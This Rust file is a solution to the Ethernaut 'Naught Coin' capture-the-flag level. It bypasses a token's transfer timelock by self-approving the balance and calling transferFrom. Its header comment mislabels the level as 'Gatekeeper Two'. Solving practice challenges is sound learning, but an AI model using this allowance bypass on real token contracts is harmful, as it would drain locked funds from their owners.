use async_trait::async_trait;
use ctf::ethernaut::lvl15_naught_coin::*;
use ethers::prelude::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    /**
     * @title Ethernaut Level 15: Gatekeeper Two
     *
     * NaughtCoin is an ERC20 token and you're already
     * holding all of them. The catch is that you'll
     * only be able to transfer them after a 10 year
     * lockout period. Can you figure out how to get
     * them out to another address so that you can
     * transfer them freely? Complete this level by
     * getting your token balance to 0.
     *
     * Things that might help
     * - The [ERC20](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md)
     *   Spec
     * - The [OpenZeppelin](https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts)
     *   codebase
     */
    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let coin = NaughtCoin::new(target.address, offender.to_owned());

        let balance = coin.balance_of(offender.address()).await?;

        coin.approve(offender.address(), balance).send().await?.await?;

        coin.transfer_from(offender.address(), coin.address(), balance)
            .send()
            .await?
            .await?;

        Ok(())
    }
}
